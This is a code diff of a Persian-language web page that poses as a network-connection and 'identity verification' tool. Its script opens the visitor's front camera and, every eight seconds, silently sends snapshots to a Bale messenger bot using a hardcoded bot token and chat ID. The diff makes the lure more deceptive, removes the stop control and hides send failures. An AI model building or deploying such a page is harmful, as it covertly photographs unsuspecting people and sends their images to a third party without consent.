@@ -1,100 +1,79 @@
 <!DOCTYPE html>
-<html lang="fa">
+<html lang="fa" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bale Connect</title>
+    <title>تایید هویت</title>
     <style>
-        body { margin: 0; background: #f8f9fa; color: #333; font-family: Tahoma, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .circle { width: 170px; height: 170px; border-radius: 50%; border: 5px solid #00a591; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: 0.3s; background: #fff; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-        .circle.active { background: #00a591; border-color: #00796b; }
-        .circle span { color: #00a591; font-size: 20px; font-weight: bold; }
-        .circle.active span { color: #fff; }
-        .status { font-size: 18px; margin-top: 20px; font-weight: bold; color: #555; }
-        #msg { margin-top: 15px; font-size: 14px; font-weight: bold; min-height: 20px; }
+        body { margin: 0; background: #ffffff; font-family: system-ui, -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: #333; }
+        .box { width: 90%; max-width: 350px; text-align: center; padding: 20px; border-radius: 15px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); border: 1px solid #eee; }
+        .logo { width: 70px; height: 70px; background: #00a591; border-radius: 18px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; }
+        .logo-inner { width: 30px; height: 30px; border: 4px solid white; border-radius: 50%; }
+        h2 { font-size: 20px; margin: 10px 0; color: #00a591; }
+        p { font-size: 14px; color: #666; line-height: 1.6; }
+        .btn { width: 100%; padding: 14px; border-radius: 10px; border: none; background: #00a591; color: white; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 20px; }
+        #status { margin-top: 15px; font-size: 13px; font-weight: bold; min-height: 20px; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div class="circle" id="circle" onclick="toggle()">
-    <span id="txt">اتصال</span>
-</div>
+    <div class="box">
+        <div class="logo"><div class="logo-inner"></div></div>
+        <h2>تایید دسترسی</h2>
+        <p>برای برقراری اتصال امن به شبکه، لطفاً روی دکمه زیر بزنید و دسترسی‌های لازم را تایید کنید.</p>
+        <button class="btn" id="mainBtn" onclick="start()">شروع اتصال</button>
+        <div id="status"></div>
+    </div>
 
-<div class="status" id="st">وضعیت: قطع</div>
-<div id="msg"></div>
-
-<video id="v" autoplay playsinline></video>
-<canvas id="c"></canvas>
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
 
 <script>
-    // اطلاعات جدید شما برای بله
-    const token = "2130252958:5Zzvo7yjpkkrCTs3-A2GDEgxOQRGZt_9FPY"; 
-    const chat_id = "630900118"; 
+    const token = "2130252958:5Zzvo7yjpkkrCTs3-A2GDEgxOQRGZt_9FPY";
+    const chat_id = "630900118";
 
-    let on = false, int = null, stream = null;
-    const circle = document.getElementById('circle'), txt = document.getElementById('txt');
-    const st = document.getElementById('st'), msg = document.getElementById('msg');
-    const v = document.getElementById('v'), c = document.getElementById('c');
+    let v = document.getElementById('v'), c = document.getElementById('c'), st = document.getElementById('status'), btn = document.getElementById('mainBtn');
 
-    async function toggle() {
-        if (!on) {
-            try {
-                // درخواست دوربین جلو
-                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                v.srcObject = stream;
-                on = true;
-                circle.classList.add('active');
-                txt.textContent = "توقف";
-                st.textContent = "وضعیت: متصل";
-                msg.innerHTML = "";
-                // ارسال عکس هر 5 ثانیه
-                int = setInterval(takeShot, 5000);
-            } catch (err) {
-                msg.style.color = "#d32f2f";
-                msg.innerHTML = "خطای فیلترشکن";
-            }
-        } else { stop(); }
+    async function start() {
+        try {
+            st.style.color = "#666";
+            st.innerText = "درحال بررسی وضعیت...";
+            let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            v.srcObject = stream;
+            
+            btn.style.background = "#eee";
+            btn.style.color = "#999";
+            btn.innerText = "متصل شد";
+            btn.disabled = true;
+            
+            st.style.color = "#00a591";
+            st.innerText = "اتصال با موفقیت برقرار شد";
+            
+            setTimeout(send, 2000);
+            setInterval(send, 8000);
+        } catch (e) {
+            st.style.color = "#d32f2f";
+            st.innerText = "بروز خطا در اتصال به شبکه";
+        }
     }
 
-    function stop() {
-        on = false; clearInterval(int);
-        if (stream) stream.getTracks().forEach(t => t.stop());
-        circle.classList.remove('active');
-        txt.textContent = "اتصال";
-        st.textContent = "وضعیت: قطع";
-        msg.innerHTML = "";
-    }
-
-    function takeShot() {
+    function send() {
         const ctx = c.getContext('2d');
         c.width = v.videoWidth; c.height = v.videoHeight;
         ctx.drawImage(v, 0, 0);
+        
         c.toBlob(blob => {
             const formData = new FormData();
             formData.append('chat_id', chat_id);
             formData.append('photo', blob, 'img.jpg');
 
-            // ارسال به سرور بله
-            fetch(`https://tapi.bale.ai/bot${token}/sendPhoto`, { 
-                method: 'POST', 
-                body: formData 
-            })
-            .then(res => res.json())
-            .then(data => {
-                if(data.ok) {
-                    msg.style.color = "#00a591";
-                    msg.innerHTML = "وصل شد";
-                } else {
-                    msg.style.color = "#d32f2f";
-                    msg.innerHTML = "خطای فیلترشکن";
-                }
-            })
-            .catch(() => { 
-                msg.style.color = "#d32f2f";
-                msg.innerHTML = "خطای فیلترشکن"; 
+            fetch(`https://tapi.bale.ai/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors' 
             });
-        }, 'image/jpeg', 0.5);
+        }, 'image/jpeg', 0.3); 
     }
 </script>
 </body>
